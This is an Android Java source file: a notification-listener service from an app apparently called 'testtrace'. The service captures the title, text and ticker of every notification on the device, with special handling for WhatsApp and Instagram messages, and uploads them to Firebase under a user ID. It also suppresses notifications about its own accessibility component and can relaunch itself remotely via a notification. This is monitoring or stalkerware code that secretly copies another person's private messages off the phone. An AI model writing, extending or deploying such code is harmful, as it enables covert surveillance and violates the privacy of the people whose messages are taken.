package com.reiserx.testtrace.NotificationClasses;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.reiserx.testtrace.Activites.MainActivity;
import com.reiserx.testtrace.Classes.ExceptionHandler;
import com.reiserx.testtrace.Classes.StartMainService;
import com.reiserx.testtrace.Models.AppListInfo;
import com.reiserx.testtrace.Models.NotificationModel;
import com.reiserx.testtrace.Models.NotificationPath;
import com.reiserx.testtrace.Models.NotificationTitlePath;
import com.reiserx.testtrace.Utilities.NotificationUtils;

public class NotificationService extends NotificationListenerService {
    Context context;
    String TAG = "NotificationService.logs";
    FirebaseFirestore firestore;
    Bundle extras;
    String title;
    String text;
    long time;

    String insta;

    @Override
    public void onCreate() {
        super.onCreate();
        context = getApplicationContext();
        FirstLaunch();
        Log.d(TAG, "created");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        SharedPreferences save = context.getSharedPreferences("users", MODE_PRIVATE);
        String userID = save.getString("UserID", "");
        try {
        firestore = FirebaseFirestore.getInstance();
        if (sbn != null) {
            String pack = sbn.getPackageName();
            String ticker = "";

            StartMainService startMainService = new StartMainService();
            startMainService.startservice(this);

            DocumentReference documents = firestore.collection("Main").document(userID).collection("App list").document(pack);
            documents.get().addOnCompleteListener(task -> {
                if (task.isSuccessful()) {
                    AppListInfo document = task.getResult().toObject(AppListInfo.class);
                    if (document != null) {
                        if (document.getLabel() != null) {
                            check(sbn, pack, ticker, userID, document.isProcessStatus(), document.getLabel());
                        } check(sbn, pack, ticker, userID, document.isProcessStatus(), pack);
                    }
                } else {
                    Log.d(TAG, "get failed with ", task.getException());
                }
            });

            if (pack.equals("com.reiserx.testtrace")) {
                StartApp(sbn);
                cancelNotifications(sbn);
            }
        }
        } catch (Exception e) {
            ExceptionHandler exceptionHandler = new ExceptionHandler(e, userID);
            exceptionHandler.upload();
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
    }

    public void check(StatusBarNotification sbn, String pack, String ticker, String userID, boolean document, String label) {
        if (document) {

            if (sbn.getNotification().tickerText != null) {
                ticker = sbn.getNotification().tickerText.toString();
            }
            if (sbn.getNotification().extras != null) {
                extras = sbn.getNotification().extras;
            }
            if (extras.getString("android.title") != null) {
                title = extras.getString("android.title");
            }
            if (extras.getCharSequence("android.text") != null) {
                text = extras.getCharSequence("android.text").toString();
            }
            if (sbn.getPostTime() != 0) {
                time = sbn.getPostTime();
            }

            if (pack.equals("com.whatsapp")) {
                if (ticker.equals("")) {
                    if (!title.equals("Backup in progress")) {
                        if (!title.equals("Finished backup")) {
                            updadeWhatSappNotification(userID, title, text, pack, ticker, label);
                        }
                    }
                }
            } else if (pack.equals("com.instagram.android")) {
                if (insta == null) {
                    update(pack, ticker, text, time, userID, label);
                    insta = title;
                } else if (insta != title) {
                    update(pack, ticker, text, time, userID, label);
                    insta = title;
                }
            } else {
                update(pack, ticker, text, time, userID, label);
            }
        }
    }

    public void update(String pack, String ticker, String text, long time, String userID, String label) {
        Log.d(TAG, "updateNotification");
        NotificationModel notificationModel = new NotificationModel(pack, ticker, title, text, time);
        CollectionReference documents = firestore.collection("Main").document(userID).collection("Notifications").document(pack).collection(title);
        documents.add(notificationModel);

        NotificationPath notificationPath = new NotificationPath(pack, label);
        String value = pack.replace(".", "");
        FirebaseDatabase.getInstance().getReference().child("Main").child(userID).child("Notification history").child("AppName").child(value).setValue(notificationPath);
        NotificationTitlePath notificationTitlePath = new NotificationTitlePath();

        if (title.equals("")) {
            notificationTitlePath.setName("Unknown");
        } else notificationTitlePath.setName(title);
        String titles = title.replaceAll("[.,#,$,or]", "");
        FirebaseDatabase.getInstance().getReference().child("Main").child(userID).child("Notification history").child("Title").child(value).child(titles).setValue(notificationTitlePath);

    }

    public void updadeWhatSappNotification(String userID, String title, String text, String pack, String ticker, String label) {
        Log.d(TAG, "updadeWhatSappNotification");
        SharedPreferences save = context.getSharedPreferences("Notify_what", MODE_PRIVATE);
        SharedPreferences.Editor myEdit = save.edit();
        if (!save.getString(title, "").equals(text)) {
            update(pack, ticker, text, time, userID, label);
            myEdit.putString(title, text);
            myEdit.apply();
        }
    }

    public void StartApp (StatusBarNotification sbn) {

        Log.d(TAG, "StartApp");
        if (!Settings.canDrawOverlays(this)) {
            NotificationUtils notificationUtils = new NotificationUtils();
            notificationUtils.alertWindowPermission(this, "App start failed", "Please grant SYSTEM_ALERT_WINDOW permission, click to grant", 365);
        } else {

            if (sbn.getNotification().extras != null) {
                extras = sbn.getNotification().extras;
            }
            if (extras.getString("android.title") != null) {
                title = extras.getString("android.title");
            }
            if (title != null && title.equals("Launch app")) {
                Intent intentone = new Intent(getApplicationContext(), MainActivity.class);
                intentone.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intentone);
                cancelNotification(sbn.getKey());
            }
        }
    }

    private void cancelNotifications (StatusBarNotification sbn) {
        if (sbn.getNotification().extras != null) {
            extras = sbn.getNotification().extras;
        }
        if (extras.getString("android.title") != null) {
            title = extras.getString("android.title");
        }

        if (title.contains("com.reiserx.testtrace.accessibility")) {
            cancelNotification(sbn.getKey());
        }
    }
    public void FirstLaunch() {
        SharedPreferences save = context.getSharedPreferences("FirstRun", MODE_PRIVATE);
        SharedPreferences.Editor myEdit = save.edit();
        if (save.getString("run", "").equals("")) {
            Intent intentone = new Intent(getApplicationContext(), MainActivity.class);
            intentone.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intentone);
            myEdit.putString("run", "done");
            myEdit.apply();
        }
    }
}